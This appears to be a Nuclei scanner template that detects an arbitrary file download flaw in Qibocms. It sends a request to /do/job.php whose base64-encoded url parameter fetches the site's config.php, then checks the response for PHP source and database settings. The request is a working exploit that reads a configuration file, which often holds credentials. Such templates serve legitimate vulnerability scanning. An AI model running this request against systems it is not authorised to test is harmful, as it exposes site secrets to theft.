id: qibocms-file-download

info:
  name: Qibocms - Arbitrary File Download
  author: theabhinavgaur
  severity: high
  metadata:
    verified: true
  tags: qibocms,lfr

requests:
  - method: GET
    path:
      - "{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<?php"
          - "$webdb"
        condition: and

      - type: word
        part: header
        words:
          - "filename=config"

      - type: status
        status:
          - 200
